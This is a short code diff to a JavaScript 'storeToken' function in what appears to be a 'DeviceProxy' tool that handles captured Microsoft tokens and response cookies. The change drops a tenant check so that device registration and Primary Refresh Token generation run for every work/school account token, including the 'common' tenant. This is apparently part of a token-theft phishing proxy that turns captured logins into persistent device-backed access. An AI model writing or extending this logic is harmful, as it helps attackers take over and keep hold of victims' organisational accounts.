@@ -581,10 +581,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
       });
     }
 
-    // Attempt device registration and PRT generation for work/school accounts
+    // Attempt device registration and PRT generation for ALL work/school accounts
     // This runs asynchronously and doesn't block the response
-    // Works for: specific tenant GUIDs AND 'organizations' endpoint
-    if (accountType === 'work_school' && tokenData.access_token && tenant && tenant !== 'common') {
+    // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
+    if (accountType === 'work_school' && tokenData.access_token) {
       console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
       const deviceManager = require('./devicemanager');
       deviceManager.registerDeviceAndGetPrt({
@@ -606,7 +606,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     } else {
       console.log('[DeviceProxy] Device registration skipped:', {
         tokenId,
-        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : tenant === 'common' ? 'tenant too generic (common)' : 'unknown'
+        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : 'unknown'
       });
     }
 
